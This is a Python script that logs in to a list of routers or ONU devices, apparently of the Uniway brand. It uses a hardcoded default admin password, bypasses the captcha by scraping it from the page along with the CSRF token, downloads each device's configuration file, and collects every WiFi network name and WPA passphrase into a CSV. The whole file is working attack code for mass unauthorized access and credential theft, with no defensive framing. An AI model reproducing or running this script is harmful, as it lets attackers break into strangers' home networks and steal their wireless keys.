import os
import requests
import re
import csv
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_login_request(ip, code, csrf):
    try:
        link = f"http://{ip}/boaform/admin/formLogin"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": f"http://{ip}",
            "Connection": "keep-alive",
            "Referer": f"http://{ip}/admin/login.asp",
            "Upgrade-Insecure-Requests": "1",
        }
        data = {
            "username1": "admin",
            "psd1": "stdONUioi",
            "verification_code": code,
            "loginSelinit": "0",
            "username": "admin",
            "psd": "stdONUioi",
            "sec_lang": "0",
            "csrftoken": csrf,
        }

        resp = requests.post(link, headers=headers, data=data)
        resp.raise_for_status()
        logging.info(f"Login request sent successfully to {ip}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send login request to {ip}: {e}")
        raise

def download_request(ip, csrf):
    try:
        link = f"http://{ip}/boaform/admin/formMgmConfig"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": f"http://{ip}",
            "Connection": "keep-alive",
            "Referer": f"http://{ip}/mgm_config_file.asp",
            "Upgrade-Insecure-Requests": "1",
        }

        data = {"action": "saveconfigfile", "submit-url": "", "csrftoken": csrf}

        resp = requests.post(link, headers=headers, data=data)
        resp.raise_for_status()
        
        filename = f"{ip}.xml"
        folder_path = "uniway_xml"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
        with open(file_path, "wb") as config:
            config.write(resp.content)
        logging.info(f"Downloaded file saved: {file_path}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send download request to {ip}: {e}")
        raise

def parse_xml_files(directory):
    """Parses XML files in the specified directory and extracts SSID and KeyPassphrase pairs."""
    ssid_key_pairs = []

    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            ip = filename.replace(".xml", "")
            file_path = os.path.join(directory, filename)

            try:
                tree = ET.parse(file_path)
                root = tree.getroot()

                ssid_element = root.find(".//Value[@Name='SSID']")
                keypassphrase_element = root.find(".//Value[@Name='WSC_PSK']")

                if ssid_element is not None and keypassphrase_element is not None:
                    ssid = ssid_element.attrib["Value"]
                    keypassphrase = keypassphrase_element.attrib["Value"]

                    ssid_key_pairs.append((ip, ssid, keypassphrase))
            except ET.ParseError as e:
                logging.error(f"Failed to parse XML file: {file_path} - {e}")

    return ssid_key_pairs

def save_to_csv(pairs, output_file):
    """Saves the specified pairs to a CSV file."""
    try:
        with open(output_file, "w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["IP", "SSID", "KeyPassphrase"])

            for ip, ssid, keypassphrase in pairs:
                writer.writerow([ip, ssid, keypassphrase])
        logging.info(f"Data saved to CSV file: {output_file}")
    except Exception as e:
        logging.error(f"Failed to save to CSV file: {e}")

def main():
    with open("uniway.txt", "r") as file:
        ip_list = [ip.strip() for ip in file.readlines()]

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_ip = {}
        for ip in ip_list:
            future = executor.submit(process_ip, ip)
            future_to_ip[future] = ip

        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                future.result()
            except Exception as e:
                logging.error(f"Failed to process {ip}: {e}")

def process_ip(ip):
    try:
        url = f"http://{ip}"
        response = requests.get(url)
        response.raise_for_status()

        check_code_match = re.search(
            r"document\.getElementById\('check_code'\)\.value='([^']*)';", response.text
        )
        check_code_value = check_code_match.group(1) if check_code_match else None
        csrf_token_match = re.search(
            r"<input type='hidden' name='csrftoken' value='([^']*)' />", response.text
        )
        csrf_token_value = csrf_token_match.group(1) if csrf_token_match else None

        if check_code_value and csrf_token_value:
            send_login_request(ip, check_code_value, csrf_token_value)
            download_request(ip, csrf_token_value)
        else:
            logging.warning(f"Failed to find check_code or csrftoken for {ip}")

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to process {ip}: {e}")
        raise

if __name__ == "__main__":
    main()
    directory_path = "uniway_xml"
    output_file = "uniway.csv"
    pairs = parse_xml_files(directory_path)
    save_to_csv(pairs, output_file)
